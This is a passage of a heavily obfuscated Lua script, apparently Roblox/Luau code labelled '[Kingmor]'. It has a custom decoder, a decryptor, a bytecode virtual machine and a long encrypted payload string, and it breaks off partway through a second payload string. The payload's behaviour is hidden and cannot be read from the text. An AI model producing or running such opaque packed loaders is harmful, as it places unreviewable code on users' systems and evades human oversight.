local _1c1d94
local function _7ad16d(msg)
  warn(string.char(91,75,105,110,103,109,111,114,93,32) .. tostring(msg))
  return false
end
local _fae3c7=(function()
return (function()
local _9510={}
for _3bo=0,255 do _9510[_3bo]=string.char(_3bo) end
local _04d={}
do
  local _gdk="dOiEArIBnflq9HT15W4JzRg8toZKN6Phep2xSka-YUuLCMDQ30wjX7_cFsvbGyVm"
  for _3bo=1,#_gdk do _04d[string.byte(_gdk,_3bo)]=_3bo-1 end
end
local function _924d(s)
  local _ktw,_7kc,_h24,_484={},0,0,0
  for _3bo=1,#s do
    local _kwq=_04d[string.byte(s,_3bo)]
    if _kwq then
      _h24=_h24*64+_kwq
      _484=_484+6
      if _484>=8 then
        _484=_484-8
        local _1x=2^_484
        _7kc=_7kc+1
        _ktw[_7kc]=_9510[math.floor(_h24/_1x)%256]
        _h24=_h24%_1x
      end
    end
  end
  return table.concat(_ktw)
end
local _43={}
do
  local _8p7="\024\214e\179s\003\142\158)\200\1328\198\197\208\222\137f\191\254\147\169&\246|\020\196O\220\210?C\150\204\236iG\172Q\140^\167\182M\154\238\148\255\237J\244\194]\162\018\250\248\2306\015\187q\008bg\229\007_\209\143\171\156\163\232\225@(\212;EXN\030tF\153\005\160\164\1304\228V7\226\216\1289[5\180\133\131=#}\1410KP\152Y\022\149\183\014\176\185\029\242p\155\000Z-T\138\202\233\219hc\231\2211\206`\215\235\n\151A\170\249L\193\028\027\165\175\129\211\227\174'\025\2232<\184d\009\173\135\134\006\205\139\189\r\002\213\247>\240\181:z\023\004$\224o+\144\1773U\188vD\201\001\026u\218!l\207\178n~x\146\"\192\199{\234k*\251\190\241\019\243a%\127S\239\161wI\\\011\157\253\145\217\168\252/y\017\012\136\021H\245\186jrR.m\195,\031\159\166 \203WB\016"
  for _3bo=1,256 do _43[string.byte(_8p7,_3bo)]=_3bo-1 end
end
local function _193f(S)
  local _clg,_1rg=2899898500,190
  local _ktw,_7kc,_klo={},0,0
  local P=219973 A=-1127720423 L=5949073
  local K={143,115,226,154,214,27,230,43,182,203,41,108,251,157,80,81,140,22,17,25,42,45,229,36,221,66,160,185,149,214,60,97}
  for _3bo=1,#S do
    _clg=(P*_clg+A)%4294967296
    local _lfg=string.byte(S,_3bo)
    local _7dh=(_clg%256+K[((_3bo-1)%32)+1]+((_3bo*113+L)%256)+_1rg)%256
    _1rg=_lfg
    local _16x=(_43[_lfg]-_7dh)%256
    _klo=(_klo*33+_16x)%4294967296
    _7kc=_7kc+1
    _ktw[_7kc]=_9510[_16x]
  end
  return table.concat(_ktw),_klo
end
local function _hs(_ba, _mb)
local _dv = table.unpack or unpack
local function _ow(...) return { n = select('#', ...), ... } end
local _zx
_zx = function(_ju, _ug, _va)
local fcbmb, _hz, f5ea7x = _ju.fcbmb, _ju.k, _ju.f5ea7x
local _rd = {}
local _ak = _ju.fiaib
for _ys = 1, _ak do _rd[_ys] = _ug[_ys] end
local _rz, _cb = {}, 0
if _ju.f8ynqd then
local _jj = _ug.n or #_ug
for _ys = _ak + 1, _jj do _cb = _cb + 1; _rz[_cb] = _ug[_ys] end
end
local _nc = _ju.f50kcc + 8
local _yd = 1
while true do
local _jf = fcbmb[_yd]
local _vl = fcbmb[_yd + 1]
if _jf == 5 then
_rd[_vl] = _rd[fcbmb[_yd + 2]]
_yd = _yd + 4
elseif _jf == 4 then
_rd[_vl] = _hz[fcbmb[_yd + 2]]
_yd = _yd + 4
elseif _jf == 11 then
_rd[_vl] = _mb[_hz[fcbmb[_yd + 2]]]
_yd = _yd + 4
elseif _jf == 23 then
local _gn = fcbmb[_yd + 2]
local _fx = _rd[_gn]
if _gn >= 256 then _fx = _hz[_gn - 256] end
local _ro = fcbmb[_yd + 3]
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
_rd[_vl] = _fx[_ro]
_yd = _yd + 4
elseif _jf == 26 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
local _nr = _rd[_vl]
local n = (_gn == 0) and (_nc - _vl) or (_gn - 1)
if _ro == 2 then
if n == 0 then _rd[_vl] = _nr()
elseif n == 1 then _rd[_vl] = _nr(_rd[_vl + 1])
elseif n == 2 then _rd[_vl] = _nr(_rd[_vl + 1], _rd[_vl + 2])
elseif n == 3 then _rd[_vl] = _nr(_rd[_vl + 1], _rd[_vl + 2], _rd[_vl + 3])
else
local _fx = {}
for _ys = 1, n do _fx[_ys] = _rd[_vl + _ys] end
_rd[_vl] = _nr(_dv(_fx, 1, n))
end
elseif _ro == 1 then
if n == 0 then _nr()
elseif n == 1 then _nr(_rd[_vl + 1])
elseif n == 2 then _nr(_rd[_vl + 1], _rd[_vl + 2])
elseif n == 3 then _nr(_rd[_vl + 1], _rd[_vl + 2], _rd[_vl + 3])
else
local _fx = {}
for _ys = 1, n do _fx[_ys] = _rd[_vl + _ys] end
_nr(_dv(_fx, 1, n))
end
else
local _qj
if n == 0 then _qj = _ow(_nr())
elseif n == 1 then _qj = _ow(_nr(_rd[_vl + 1]))
elseif n == 2 then _qj = _ow(_nr(_rd[_vl + 1], _rd[_vl + 2]))
elseif n == 3 then _qj = _ow(_nr(_rd[_vl + 1], _rd[_vl + 2], _rd[_vl + 3]))
elseif n == 4 then _qj = _ow(_nr(_rd[_vl + 1], _rd[_vl + 2], _rd[_vl + 3], _rd[_vl + 4]))
else
local _fx = {}
for _ys = 1, n do _fx[_ys] = _rd[_vl + _ys] end
_qj = _ow(_nr(_dv(_fx, 1, n)))
end
if _ro == 0 then
local _mm = _qj.n
for _ys = 1, _mm do _rd[_vl + _ys - 1] = _qj[_ys] end
if _mm == 0 then _rd[_vl] = nil end
_nc = _vl + _mm - 1
else
local _bl = _ro - 1
for _ys = 1, _bl do _rd[_vl + _ys - 1] = _qj[_ys] end
end
end
_yd = _yd + 4
elseif _jf == 27 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
_rd[_vl] = _gn + _ro
_yd = _yd + 4
elseif _jf == 13 then
if _rd[_vl] then _yd = _yd + 4 else _yd = _yd + fcbmb[_yd + 2] * 4 end
elseif _jf == 41 then
_yd = _yd + _vl * 4
elseif _jf == 36 then
local _fx = _rd[_vl]
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
_fx[_gn] = _ro
_yd = _yd + 4
elseif _jf == 42 then
_rd[_vl] = fcbmb[_yd + 2]
_yd = _yd + 4
elseif _jf == 28 then
if _rd[_vl] then _yd = _yd + fcbmb[_yd + 2] * 4 else _yd = _yd + 4 end
elseif _jf == 22 then
local _gn = fcbmb[_yd + 2]
if _gn == 0 then
local n = _nc - _vl + 1
if n <= 0 then return end
local _fx = {}
for _ys = 1, n do _fx[_ys] = _rd[_vl + _ys - 1] end
return _dv(_fx, 1, n)
end
local n = _gn - 1
if n <= 0 then return end
local _fx = {}
for _ys = 1, n do _fx[_ys] = _rd[_vl + _ys - 1] end
return _dv(_fx, 1, n)
elseif _jf == 7 then
local _gn = fcbmb[_yd + 2]
for _ys = _vl, _vl + _gn - 1 do _rd[_ys] = nil end
_yd = _yd + 4
elseif _jf == 15 or _jf == 32 or _jf == 40 or _jf == 21 or _jf == 35 or _jf == 30 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
if _jf == 15 then _rd[_vl] = (_gn == _ro)
elseif _jf == 32 then _rd[_vl] = (_gn ~= _ro)
elseif _jf == 40 then _rd[_vl] = (_gn < _ro)
elseif _jf == 21 then _rd[_vl] = (_gn <= _ro)
elseif _jf == 35 then _rd[_vl] = (_gn > _ro)
else _rd[_vl] = (_gn >= _ro) end
_yd = _yd + 4
elseif _jf == 9 or _jf == 12 or _jf == 8 or _jf == 18 or _jf == 10 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
if _jf == 9 then _rd[_vl] = _gn - _ro
elseif _jf == 12 then _rd[_vl] = _gn * _ro
elseif _jf == 8 then _rd[_vl] = _gn / _ro
elseif _jf == 18 then _rd[_vl] = _gn % _ro
else _rd[_vl] = _gn ^ _ro end
_yd = _yd + 4
elseif _jf == 3 then
_rd[_vl] = (fcbmb[_yd + 2] ~= 0)
_yd = _yd + 4
elseif _jf == 43 then
_rd[_vl] = {}
_yd = _yd + 4
elseif _jf == 2 then
local _fx = _rd[_vl]
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn == 0 then _gn = _nc - _vl end
local _fi = _ro - 1
for _ys = 1, _gn do _fx[_fi + _ys] = _rd[_vl + _ys] end
_yd = _yd + 4
elseif _jf == 14 then
local _gn = _rd[fcbmb[_yd + 2]]
local _ro = fcbmb[_yd + 3]
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
_rd[_vl] = _gn[_ro]
_rd[_vl + 1] = _gn
_yd = _yd + 4
elseif _jf == 19 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
local _uv = _rd[_gn]
for _ys = _gn + 1, _ro do _uv = _uv .. _rd[_ys] end
_rd[_vl] = _uv
_yd = _yd + 4
elseif _jf == 33 then
local _pt = f5ea7x[fcbmb[_yd + 2]]
local f1zb = {}
local _tq = _pt.f1zb
for _ys = 1, #_tq do
local _es = _tq[_ys]
if _es.f1pt9z then f1zb[_ys] = _rd[_es.fuh70] else f1zb[_ys] = _va[_es.fuh70] end
end
_rd[_vl] = function(...) return _zx(_pt, _ow(...), f1zb) end
_yd = _yd + 4
elseif _jf == 31 then
local _gn = fcbmb[_yd + 2]
if _gn == 0 then
for _ys = 1, _cb do _rd[_vl + _ys - 1] = _rz[_ys] end
_nc = _vl + _cb - 1
else
local n = _gn - 1
for _ys = 1, n do _rd[_vl + _ys - 1] = _rz[_ys] end
end
_yd = _yd + 4
elseif _jf == 24 then
_rd[_vl] = _va[fcbmb[_yd + 2]][1]
_yd = _yd + 4
elseif _jf == 1 then
_va[_vl][1] = _rd[fcbmb[_yd + 2]]
_yd = _yd + 4
elseif _jf == 25 then
_rd[_vl] = {}
_yd = _yd + 4
elseif _jf == 34 then
_rd[_vl] = _rd[fcbmb[_yd + 2]][1]
_yd = _yd + 4
elseif _jf == 39 then
local _fx = _rd[_vl]
_fx[1] = _rd[fcbmb[_yd + 2]]
_yd = _yd + 4
elseif _jf == 20 then
local _fx = _rd[_vl]
local n = fcbmb[_yd + 3] - 1
local _ys = fcbmb[_yd + 2]
while _ys <= _nc do n = n + 1; _fx[n] = _rd[_ys]; _ys = _ys + 1 end
_yd = _yd + 4
elseif _jf == 17 then
local _nr = _rd[_vl]
if type(_nr) ~= 'function' then
local _fx = getmetatable(_nr)
local _gn, _ro
if type(_fx) == 'table' then _gn = rawget(_fx, '__iter'); _ro = rawget(_fx, '__call') end
if _gn ~= nil then
_rd[_vl], _rd[_vl + 1], _rd[_vl + 2] = _gn(_nr)
elseif type(_nr) == 'table' and (_fx == nil or (type(_fx) == 'table' and _ro == nil)) then
_rd[_vl], _rd[_vl + 1], _rd[_vl + 2] = next, _nr, nil
end
end
_yd = _yd + 4
elseif _jf == 37 then
_mb[_hz[_vl]] = _rd[fcbmb[_yd + 2]]
_yd = _yd + 4
elseif _jf == 16 then
local _gn = fcbmb[_yd + 2]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
_rd[_vl] = -_gn
_yd = _yd + 4
elseif _jf == 29 then
local _gn = fcbmb[_yd + 2]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
_rd[_vl] = not _gn
_yd = _yd + 4
elseif _jf == 6 then
local _gn = fcbmb[_yd + 2]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
_rd[_vl] = #_gn
_yd = _yd + 4
elseif _jf == 38 then
local _gn, _ro = fcbmb[_yd + 2], fcbmb[_yd + 3]
if _gn >= 256 then _gn = _hz[_gn - 256] else _gn = _rd[_gn] end
if _ro >= 256 then _ro = _hz[_ro - 256] else _ro = _rd[_ro] end
_rd[_vl] = math.floor(_gn / _ro)
_yd = _yd + 4
else
error(('E'..tostring(_jf)), 0)
end
end
end
return _zx(_ba, { n = 0 }, {})
end
local function _st(_uv, _kv, _xc)
_kv = _kv or 1
local function KMVX8(_vl,_ro)
_vl=_vl%256 _ro=_ro%256
local r,_ju=0,1
for _=1,8 do
local _qy,w=_vl%2,_ro%2
if _qy~=w then r=r+_ju end
_vl=(_vl-_qy)/2 _ro=(_ro-w)/2 _ju=_ju*2
end
return r
end
_xc = _xc or 45046
local function _az()
local _gn = string.byte(_uv, _kv)
_kv = _kv + 1
_xc = (_xc * 3377 + 45046) % 65521
local _hz = _xc % 256
local v = _gn - _hz
if v < 0 then v = v + 256 end
return v
end
local function _la()
local n, _ie = 0, 1
while true do
local _gn = _az()
n = n + (_gn % 128) * _ie
if _gn < 128 then break end
_ie = _ie * 128
end
return n
end
local function _wb()
local n = _la()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _hd()
local _ju = {}
_ju.fiaib = _la()
_ju.f8ynqd = (_az() == 1)
_ju.f50kcc = _la()
local _ll = _la()
_ju.f1zb = {}
for _ys = 1, _ll do
local f1pt9z = (_az() == 1)
_ju.f1zb[_ys] = { f1pt9z = f1pt9z, fuh70 = _la() }
end
local _eh = _la()
_ju.k = {}
for _ys = 1, _eh do
local _ze = _az()
if _ze == 0 then _ju.k[_ys] = nil
elseif _ze == 1 then _ju.k[_ys] = false
elseif _ze == 2 then _ju.k[_ys] = true
elseif _ze == 5 then
_ju.k[_ys] = _wb()
elseif _ze == 3 or _ze == 4 then
local _xn = _la()
local _os = {}
local m = 237
for j = 1, _xn do
_os[j] = string.char(KMVX8(_az(), m))
m = (m * 239 + 174) % 256
end
if _ze == 3 then _ju.k[_ys] = tonumber(table.concat(_os)) else _ju.k[_ys] = table.concat(_os) end
else
_ju.k[_ys] = nil
end
end
local _tf = _la()
local _ho, _wm = _la(), _la()
_ju.fcbmb = {}
if _tf > 0 then
local _sp = {}
for _ys = 1, _tf do
_sp[_ys * 4 - 3] = _la()
_sp[_ys * 4 - 2] = _wb()
_sp[_ys * 4 - 1] = _wb()
_sp[_ys * 4] = _wb()
end
local _sa = {}
for _ys = 0, _tf - 1 do _sa[((_ys * _ho) + _wm) % _tf] = _ys end
for _ys = 1, _tf do
local _zt = _sa[_ys - 1] + 1
local q = _ys * 4
local _es = _zt * 4
_ju.fcbmb[_es - 3] = _sp[q - 3]
_ju.fcbmb[_es - 2] = _sp[q - 2]
_ju.fcbmb[_es - 1] = _sp[q - 1]
_ju.fcbmb[_es] = _sp[q]
end
end
local _oh = _la()
_ju.f5ea7x = {}
for _ys = 1, _oh do _ju.f5ea7x[_ys] = _hd() end
return _ju
end
local _pt = _hd()
return _pt, _kv, _xc
end
local _56a8={
"fxyhJ7qiJZYzQPuUwSVY1LAAmNykvI0-cDQo60mKJ1iP_m7LBoC58Wo7MWObKVOD7zGyt6xp9D94n5TVL0lSWZooh--Z0CZMPWYsYgoCnFb_nYN-I-WTr2OiJ6ZBh6LvdLisOTWTsiZ8MSei_sOX6vhvlXyIAqHKYiJsh9nHVDSaV08MnZBRcCt6WGVIfiePF_KICVwNGRzZlF_hIFOID1wWmdokckLzP93Us_fe5AoJPNU_VTDWklzu4LZetu-RIEv9kBa9xCgqgH6Avx8Cyfn951B9zcsx8egUNhPxCM84QlA8-eOjea5EBfJu5tXEdwSCi-MO0WTZezPwrSNDZlbbZWww6dDjh3ayMt0ToYvkAjIa4-AcNDYLnCp0buW8pv8Iu6GvHDG0EwO34COIXzaSea5vwZDPXTtiCGUqqd_qVOcQwTPSTjx94J99iTou4GFZc_qcwZDI2TCL41-g3_PhZynSAesFKG9Z0J2ohbX56ToToLeMYW2dEfnmFsGLKQu55QSOj2ICfd6VfzWq2IxcIu-VKA6LjLhmyBXlsaKNAN1RBsFiYdR7Hvpy8ruQPFNezU9rrd-bkL7AMQxtRO0qRa9InO2Bh2cWSWl2pmU7crcYzmG17p2avPvqiOg61FZ3plUMbOUaF3A1hu6LROYQx5Ey09swZIGUCHen3SOvMdSgCYQweAOaY-dWemv_Gok2qQ0cPSqdfj6vfikPzDxh6tgLhP707ph4qCkwm6_rWxn6n1eGoGE1wbyRu2TWXs_tfeNeA7Z66j7JLe3M-q0J7v0rKT2EurnNnfD8FzB2G-lA4uJxUh8OBURJCmEtzAc9VA5fM-vCbScglapPM2MGWztb_Zri1rd7w9BtotCvAB65M9vO8RuNf1pVrjB3UK3kwu-jk8rtP0ZkDqmGVUw-hHTvL9iaJ-PhYaVQbqNeK7lVB-r_fxQrkxRMf2DxHa0tYNeTslneyZBgKW6DVHCIDyeHVexuja0_K-u4uXDVdCYb0TGXKr2t9N5ISdDVHsf9SrYpfhCKyY9xipsI2YlcQEEqId6_XeQtYv48waAYwjXDkTMS0ISNqCqxgdu_GUSeZ3LeDnYUDwZ1rGebPtO8JubcKEpFiWIOfWF1aTLLnVzi7bA456QTwTrVOh6Y8758CDWzMoxShawu2mnKzUGjnhZ9XkS4OweJNY3cDWlbXESBF938y0cBjhBBph_fgaiU0vK0fTYzzdzFcGXN5pDl_i0gFnr6b91WSgV-wxnRi4LdfHHo2iBxHEEsjU8udbQJbPVx_dUFvl58TIzGyXhjQb6h4vTE3ZwW9iP_VMET1e2fJYK7X76XDBuclB_vq9sjTBCoDOUKMQF4R40UtTik4Y9DknOd7T5zi5eNO9Gnx6MNOaabR2W53hAzrfum0HfzO0NB-pKDY5XghvF1crQN-ZJdGdukJKWGjORK3XmWogRppXHS2s7-Yl5igh2RNM_GzcipJAb6mEr2SE0phWwB3MimhtiMXUJ4Lx8U0Qt1KnKCvdiG56TU4HL6vVT4JYXfKAIdbwZc7nkLcbnOsy6aUh-rSsccy4z9XnCoNCJV8Uzi6awJO9bD-1Ofn_UtVtCla5Gchwcc717DTdehvfJhm74hl6mcJeLnW-2q12xYnB_4jjjkQANZh8K_spLYHqh3FWZDYggvJlAo5Cr0G6s6BVTac3OtS5vfReVL8YBSkn0mhJ1TyUFwXxn0VpV1NGzFT5bUtCI5135G74LuqI-aewTSmiQvRIIhi5kUWL0gd8KzbYHidCyCX0dvyQ7rRBzDL-5UJA9sXxc3bgeBKbq8lBgYZr_jMUkQo8Lq9Y9-h5kEVe0cq_0aZNEvP3jSfgaeMU85Y0ehvdw4RzzOhPgAqy-eKhDaN0SnjFLVFqWzzsD7X505njn6Z7luiWuGVKK-2XSq8Q7S245nOND9MbrRQv7XiNd81v7ITBJPZrXfW2Q3d0bvF1__OSIQKH30i9OXBcKvkw-K2Bq251XN9jWKX-l-4p0H1OUyciJfKnAd3uIb8LW3AbsnjbODeLcLYy6eKq0yaOYUPVVmkUQpfBAhb06zVlUfKql81k_2-65tgnacCZxp4Dgx4eOvePCBIG5ht-jzUQ9Xd9lG6iL1KepPG0uOU_AhfefJr5VGRPDOmsgViV6g3pegJFNQHlPpprKYLReT9D6qHx31_SNzxte_Fn0EYXB7LfYEKU6vV7Po3Gi3UmtoQFzqGefRaJU0fFmQmKNbVjseXLC079yHJtyHQxlp7bn2GszRCrHdyO1REgZYJQN1Bqyczk7NwYM4ze_0jR3m9VYWr-GD7XA_JuWiKrS54e1_OOgO3VQpgtyJotkwWtTR3RXa0PoR04z7RgUTWYQjb4bzsvpSLSG16ldy8xxFn4AhwrXEQwxR02kYECRI1zQL_uqrvksS3uzjHeTwvx9rCSKF9XNz9PRAzP4lvUViVb-wRQSdEzFgSXwviM5FpWve5NEQtGnyd1JHKcdSof7eLh5P7izlYSKM6aa6pHFTRRDxStCndcIluGEgXrQaduFAbJixvHmBSAYvuA5aOGJIRz_HN6a4PzvdJVF5IkguK2wfzG2MDjHtJd7YxRXi8q6x72azP7hAh5u7N1pDbpvtvJeVEY9-Y_-2L5pwS7Sj5D9tDF9j88UopxJgSaq9dgN8dza-DYWVogu43hFIhdyPjYy5txtiPWn3dZpZaWVTogmeF3hUSBz5Q8iWKHB-Vzj1cAqw0dkvC-J4jlQxKPZyKInBDTKwB0_54feM-cpA7S3KCIvqbylY2ggV1dWQ9oJJ5uQowlwQNAo9yB6Ky0Q26QnIXK2QyBq_LjY9aN8sddq15_KfsYOGF05dTwTxXHS0UobFRQpaSwByqiwUiIeNVVDL0fa-z058SBgCyRcNUuCEvIHcITB9XuzreipiHjF92AiaZizAKbGGMVaxvFLq7PioKoxlOSJY7RFmydwwnQj6D2luGwBiiosumlBxcsxRSgVDwZG9ZiRw4sIlU2dvtDak3zrqhVREvD2Rsu_Ex8DoxZ7W8uDiMd-UvBaP2HSgTtbpHzGEXxQd8aPROEpVyvjUxlO-hyxUGGXUWhlmJ_RcD5xhhlJeE-o5yDfsKf9wbp8lCkHFctoAnnkCgvKV64zHILqosqPeKv4lvgUR5LUOPtMziSE-mHRJr8NByZVOrzTv1url25apmbVIZGJQCjju3AtuMGhEgoTAlucv-hP3GKQBPJdyljxY05jjLtQ_POKsx0mHy-e21-pudZZmEJFQlLNsgFcj4ya2mQtZomU6CxPXbvxfYY0JR_G_52Dnk27jacpa8fcwjElhCO5pJ_VMwHFAFc5HDMKZmoY4J15wWSo9eb8zKHLmLQkxgqNQyWs-1eqTnaWBrugJEeWHlu9MwkLioiuwSUO6WVpOeBnqsULkxWOIT1-7cnmutE7qJ_PjQIAGJegSlQjZhNfNspMOKLaUaOlLvFsgx_Gx2SVX6qg9kUFQnujctizfnXpUr1nl0jNQv6cijHMtP76VQFQKfwxqGBkjECcsAxKQwniyaY19GSAjYOPFm61LGcapdKN8aawkonC43HsF0libnNLi4JpsMCuNeA8VQthcQDFCGHsFyobSamlD8kpUL7twwLt3UYPfFwhXloh9PcIGq4ZtfW9xFfLPZ85Gf1ybAtX5d2UnAWKO0702w_n6T2Ba9U5OWbYCjsJY053qa00IC741rAX0eirLvqAKvtx8zlfrgQMIu7tH9UVX6m0lV7B12RBGaTU_Xu6nG1uPdluG_RLuPaZpF-MG2JLGrujjtnYreTliEOQAd7OwsMJ34FZflLGOhh783eke2Rvfm-C-OZn4LKQMp2WF8DMCmfRuwSWFCoTVWCSkqIGSkH3j7CfXSP1o58lQNfmry2hYwveSA15DehrV9yeW5Ww95CtN_CF32sx2zbWYLb2tU9sbjSJInm4vICUYn2-JR3dggRWEjRsn4qTX11NJeR0DypztgUy6re-FKHpcWZx08bHrYYrGll2nvQf7hMWDFUI3UgX6MtdfcQFXQJdJCkSPm6iv8UbEe4-K6PuNpDTVwDtZC5GR8pihvOX7IeXBGzWISsbt-ojPcrs5gGXC5FhaV1FKctuTb9dFoOmiZ5_5A2w-W-oIJDIrHcLq0blX1PMHomIaCItpNOr5fU-lGZi9wLhnx8mrlRvBZoyFNouTFj0Ax_TYyBwEmNGE9lO6Z_h4dnEh1hk6QyVr17bws5Y35XScr74qKwWULmIIOp3cEvgSXG_FRopbXKIcXRxjWn3LkuuxTXVPYXXdWRurJmiqC2oh_BAlh06yASxMG2NtL8suyhgWJiu9_zGJv-IXw_4X0L8n7YcdqeU9fXhr6oQuAil9qcrzrLaU5aZK3m1PNVcU9ckJnxVVgG7BORjZoyiGXaZ81CKjaweJ3liEUd0M7uhyHPUwHYT5SrDWozWB3j8K4lL26WX5HqmxEui_3Z35fUNj-EZyS05omYYsD9LdIQ_pGSwBZhqskEUzvC-NUgO4SKo86mxkCMdcAlEyksYjEjhfA6muPm2MZXSHEG80FywvA__9YQfRhFopXtFBuesxm7VMZeuXLfbqC4Mb2Df-DHAswBxIGCRFmPbKQvXHnagW5HICw8-VFdc7Bq0LaeIcKQtXK1jKRnpCheTV2ZuwPsYoaTRKWQGqYk1NelboxCLsGU9X2qP6oMh6NvwtZbuXPVMPh33YTvQSQirTlqkayZ490Q83tD-z0fPMc6Q5QaFcWgI24UidEQM_giGVlnJsZrDfd_ppxyIjNUdhb8VvO-ZfmIDAn4-hAUqWiu1mYC5Fk8O04H87SXhXMSjixCxGkiZOADlj2HYdWRe3WZyXniDHjp1yAE97vugAv0NSuG0cbMoR0OXxoqVIoAVQLeWVy1ol5oJWPaMgNt5xjAv3GtfdNb6B6ZN29YPAzz9cMjE5MEj76Gm6d2r3rtun0a3sLt0z8MEvaEfxz5jOKFhr-XJWxm6Qh4Ubu4MxYY0i-Q4iryUXyHyr0ek_iqKOOx4YMQb-4auPcjDDO4j1n6uuxLjicCRo_4Gj45wKaIeo7O_PN0i2sStEHMzIWPD5ISH1dLe2R1Fo0d0uZ6D5sQ4HJdBCOrxamPGGPc7RDHNx0_-UFszYATisYuQNrKI_3zzYDayL8PfujRwmEvP6QnDdXRDUlIKnIOvhXM1PioBQQnGBBUlaKViksFfjYjI3LdBlkX8Cb5wczrGuVG861n441GHUNoluIzC18GdFOZ47U3LhZEFvXf4Q61t8U87tRJDA7bH4t6EV3CyfOPd-RC_p2_M4K8Yvnt7J7fVX30X1JHrqfKr8IwDW22MjdqH5irTT_tat_cC-EkjyqNO_006zS7wpbxCsdLZuQkimpn72BfrjJLB_vvUibALusmKcyAOQ198U1q73ABmmitfY92YurZv6unmoXQQa8xWlB09r7bYKoXQlCbTV4jW9vrw3n0EZh7EvleScYzMe49Unzzu7kzJJXoemeOg_dIOyLwZPns6Ou7XgRTr3dgKxHjI11tokKrT4Sq8IXPSgi0JLQCnZzBa1nXb3Ul70Fjw3obXQnWW3fEeAZnggzIfXBaB0oUfs11__8TNTWJggjj9XU7I6rTU5dTG5akdRIHzlrXyi1g03QHYKtEin1IsJ8RMX9v1W8Snyb304oNNdZTzDtkzo9Y81eYRES3OjCtwp7YQrFfSyi3IdRNt7ecT8Nw-PeiZyYCL2GRx_XGAe6a8wgYDxe9UqldAwxjV6hHFJuZMLQ1C4mHZ7Zja5ufOeOSyvncnI0PGBcrVYhL1MJGKE40h11tIXVBkFgcsfpCd7ila5M3ByLDHsBh_TXKk2sTpafWNL7KRAy8v3Zo90MakTLzPdE2vvkPHefqidkWhTXywVIeSoAKyG3Bbf28VK1q2bzUpLpcfYvfE_bjBL42cC-77etj2wrAGmu-YDP0pHsD96Q8gqGkRGXn-q_phqDjZXYfrWfN4YMfszGa5HjiOt8jcI9El2EFM6_8NlhB7XVT1nKKkVI4INKcMy4yYX5VXW8in5hUERIz3K_YcrrHHif71GMY2h5JjBsBP33EI6V5FJTfpBXDvO7DGIQuu6JMOFsvWOD8GjtonmqF3vb5kU708hjt33dmAohvzaBO1l41tLEXD_mYyYMTJQX987gdzOPG2SwSd0JXP4Ghphmo9ZSXlbxCIBnPyBCW3RbfjN141llimNXbfhI0KmtgKFyoFanwNb4vw_Gggt1p5leBuItEecRMfKZYPGa8jqhKxQUU6YDLsdGz4kzygBP-du6qQs26cQ6ThUwUsDPkKG2h4QsGD6sRRVNhyIaN6V2lWrYXXb9yjbygtTlGtiZk-HCYfU3OkRm1OjCg1tcIKVMMbA1jZifsWZ2nZWyM95QZSBsaSdxPVF1QNXx-g3Rou0UthQav-Dmpy34KuzzEuk7lQnqVqfcwtOXcozwQZNw19L1dfurgUJ3s9U67LORncSChIKhfufdihCrdNKrGJNZgJIkNlybEdbVcepeomvQaeXPzmiupJS5nIKJtyViVgn0EiDzbSy3seTpOmPOZWZR1ooJp77Q82-A7Ek8lW1qveS8tGTXnoVvrDPdiQwB_nXRrrJtFe-ncbr-kGsgdFr6GabxcjMJ25bIKEVOLMSuSksW3CM1nFQFeoZFiqZ4C8bLCHOeDtk4pLgjBB8D90EXDfx0i9J-etVTueYU1mjoRUx8IvI35Ly3Alc0IFwIRDCqnawEAa59OgT1ws-8zelUe-dudZrYkFklxtWZIJEY3uVru-wdPovxBpLHEiRucMliMrKbHf0zok0IrgssQa5jKlhBVv7SP3wXPV07lnP8GrrYCG73YkYnIt9enozF5Wy2YXpwYmnDmWn6MO67HLExY9n27hu71jKlb1lWsv2QZwQTtGzDbO50vomRWrScuWkgImvUctXlvLBl_wdaO4RCBBDGgg6dyGfXRaC7",
"OJ4l5N9t5bfQMy21LzI2_-Ha_CWQpaD8wuHSRZEo7yV_KAsHzSGWSdgFn_cVJP517znxf8wXacUTKGvTQyakK1jS7LZkGvxlr7p59JO2x-L5euZnOsQ_EhUBCm1RJnUuaajmFKOo0pxUKcI-LAZD_qqyFUUUTGrLE-Z-qNDPx3whWJX4KwdJDuVcxrT1EdglvoOGUQxFQWdQRWL0FIQlCuSB6reNYPewuchlsYBOLqBs4ey0-e_C9UhErb2L5D3DBpU9h_0UOtLQE5FqYvJvXzjYADh5Gs1wiJpkRyLOJKCGImVOT8pmi8EUXxZvn7AQ7Ty4Zo9m7r6baoe_2hvhCw1XeVdzkbOj1eI1nVc4QfShj449W9cX8_LvOSLvHB8wrIpP0BHmhZjQ-L16MURo7aspBNjqujwzHuDAEAf8_FOynA6tevev1P7owW03-KSFoE75AlWojRcNOK4yMVVd46awjOZB5HkTKd0h6uA7slarH8oehbCb3oUoK9Tvc3CUiN5YBIOln9f-_MSB5AvRM2Whn_NS5KJS4lMhBP3hhwhsbS5tt6sUVEtefefcdyUBwXcGSWOegJdfvN8Ngr-HSBSQGsy_X2hcvSQ3gDhmgHRAhF7nldqtzLCc7kHhx-gZL-nZcD4sl_41b